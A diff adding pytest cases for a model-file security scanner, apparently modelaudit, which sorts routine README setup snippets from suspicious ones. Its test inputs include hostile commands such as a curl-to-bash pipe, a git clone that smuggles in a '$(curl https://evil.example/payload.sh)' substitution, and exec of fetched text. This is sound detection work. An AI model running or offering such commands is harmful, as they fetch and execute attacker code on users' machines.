@@ -5112,6 +5112,172 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
     assert determine_exit_code(aggregate) == 1
 
 
+@pytest.mark.parametrize("crlf", [False, True])
+@pytest.mark.parametrize(
+    "content",
+    [
+        "```bash\ngit clone https://github.com/ggml-org/llama.cpp.git  # build locally\n"
+        "# git clone --branch support https://github.com/example/llama.cpp.git\n"
+        "cd llama.cpp\ncmake -B build -DGGML_CUDA=ON\ncmake --build build --config Release -j\n```\n",
+        "```shell\nconda create -n demo python=3.12\nconda activate demo\n"
+        "git clone https://github.com/example/model.git\ncd model\npip install -e .\n```\n",
+        "```bash\nuv pip install --pre vllm==0.10.1+gptoss \\\n"
+        "  --extra-index-url https://wheels.vllm.ai/gpt-oss/ \\\n"
+        "  --extra-index-url https://download.pytorch.org/whl/nightly/cu128 \\\n"
+        "  --index-strategy unsafe-best-match\nvllm serve openai/gpt-oss-20b\n```\n",
+        '```python\nfrom openai import OpenAI\nclient = OpenAI(\nbase_url="http://localhost:8000/v1",\napi_key="EMPTY",\n)\n```\n',
+        '~~~py\nclient = OpenAI(base_url="http://127.0.0.1:8001/v1/")\n~~~\n',
+        '```python\nclient = OpenAI(base_url="http://[::1]:8000/v1")\n```\n',
+        '```python\nclient = OpenAI(base_url=os.getenv("OPENAI_BASE_URL", "http://localhost:8000/v1"))\n```\n',
+        '```python\nllm_cfg = {"model": "demo", "model_server": "http://localhost:8000/v1", "api_key": "EMPTY"}\n```\n',
+        '```python\nmessages = [{"role": "user", "content": '
+        '"https://qwenlm.github.io/blog/ Introduce Qwen developments"}]\n'
+        "for response in bot.run(messages=messages):\n    pass\n```\n",
+    ],
+)
+def test_routine_documented_examples_are_informational(tmp_path: Path, content: str, crlf: bool) -> None:
+    _assert_model_card_endpoint_informational(tmp_path, content.replace("\n", "\r\n") if crlf else content)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git clone https://evil.example/repo.git",
+        "git clone https://github.com.evil.example/owner/repo.git",
+        "git clone https://github.com/owner/reverse-shell.git",
+        "git clone https://github.com/owner/payload.git",
+        "git clone https://user:password@github.com/owner/repo.git",
+        "git clone --upload-pack=payload https://github.com/owner/repo.git",
+        "git clone -c core.sshCommand=payload https://github.com/owner/repo.git",
+        "git clone https://github.com/owner/repo.git && python repo/payload.py",
+        "git clone https://github.com/owner/repo.git\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git\nbash repo/payload.sh",
+        "git clone https://github.com/owner/repo.git $(curl https://evil.example/payload.sh)",
+        "git clone https://github.com/owner/repo.git\ncat <<EOF\npayload\nEOF",
+        "uv pip install --extra-index-url https://evil.example/simple demo",
+        "uv pip install --extra-index-url https://download.pytorch.org.evil.example/whl/ demo",
+        "uv pip install --extra-index-url https://user:password@download.pytorch.org/whl/ demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/?token=secret demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/payload.py demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/ --config-settings=payload demo",
+        "uv pip install --extra-index-url https://download.pytorch.org/whl/ https://evil.example/payload.whl",
+        "curl https://download.pytorch.org/whl/ | bash",
+    ],
+)
+def test_documented_setup_preserves_suspicious_commands(tmp_path: Path, command: str) -> None:
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, f"```bash\n{command}\n```\n")
+    assert any(
+        check.details.get("type") in {"network_command", "url_detected"}
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://evil.example/v1",
+        "http://localhost.evil.example:8000/v1",
+        "http://localhost:8000@evil.example/v1",
+        "http://user:password@localhost:8000/v1",
+        "http://localhost:1337/v1",
+        "http://localhost:8080/v1",
+        "http://localhost:8000/shell",
+        "http://localhost:8000/payload.py",
+        "http://localhost:8000/v1?token=secret",
+        "http://localhost:8000/v1#payload",
+        "http://localhost:8000/%76%31",
+    ],
+)
+def test_documented_client_preserves_suspicious_endpoints(tmp_path: Path, url: str) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, f'```python\nclient = OpenAI(base_url="{url}")\n```\n', "url_detected"
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        'client = OpenAI(base_url=f"http://localhost:8000/v1{suffix}")',
+        'client = OpenAI(base_url="http://localhost:8000/v1" + suffix)',
+        'client = OpenAI(base_url="http://localhost:8000/v1")\nexec(source)',
+        'import subprocess as sp\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsp.run(command)',
+        'client = OpenAI(base_url="http://localhost:8000/v1"',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nexec(messages[0]["content"])',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nother = messages',
+        'messages = [{"role": "user", "content": "https://evil.example/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/ https://evil.example/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/payload"}]',
+    ],
+)
+def test_documented_python_preserves_payloads_and_unproven_values(tmp_path: Path, source: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, f"```python\n{source}\n```\n", "url_detected")
+
+
+@pytest.mark.parametrize("filename", ["config.txt", "payload.md", "README.txt"])
+def test_routine_example_policy_is_limited_to_markdown_model_cards(tmp_path: Path, filename: str) -> None:
+    result = _scan_text_content(
+        tmp_path / filename, '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n'
+    )
+    assert any(
+        check.severity == IssueSeverity.WARNING and check.details.get("type") == "url_detected"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'client = OpenAI(base_url="http://localhost:8000/v1")\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n~~~\n',
+        '```text\n```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        "```python\n# " + "x" * (16 * 1024) + '\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        "```text\nexample\n```\n" * 129 + '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+    ],
+)
+def test_routine_example_policy_requires_complete_bounded_fences(tmp_path: Path, content: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, content, "url_detected")
+
+
+def test_routine_example_does_not_hide_later_same_url_execution(tmp_path: Path) -> None:
+    content = (
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n'
+        '```python\nexec(requests.get("http://localhost:8000/v1").text)\n```\n'
+    )
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert [check.severity for check in checks] == [IssueSeverity.INFO, IssueSeverity.WARNING]
+    _assert_documentation_network_actionable(tmp_path, content, "network_function")
+
+
+def test_routine_example_keeps_blacklisted_destination_alerts(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("```bash\ngit clone https://github.com/example/model.git\n```\n", encoding="utf-8")
+    result = TextScanner({"network_comm_config": {"custom_blacklist": ["github.com/example"]}}).scan(str(path))
+    assert any(
+        check.details.get("type") == "blacklisted_domain" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git clone https://github.com/owner/repo.git $(python payload.py)",
+        'echo "\ngit clone https://github.com/owner/repo.git\n"',
+        "git clone https://github.com/owner/repo.git\x0bpython payload.py",
+    ],
+)
+def test_routine_setup_proof_rejects_shell_substitution_and_incomplete_strings(command: str) -> None:
+    from modelaudit.scanners.text_scanner_support.documentation_examples import routine_documentation_url_spans
+
+    assert routine_documentation_url_spans(f"```bash\n{command}\n```\n".encode()) == ()
+
+
 def _assert_documentation_routed_to_text(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
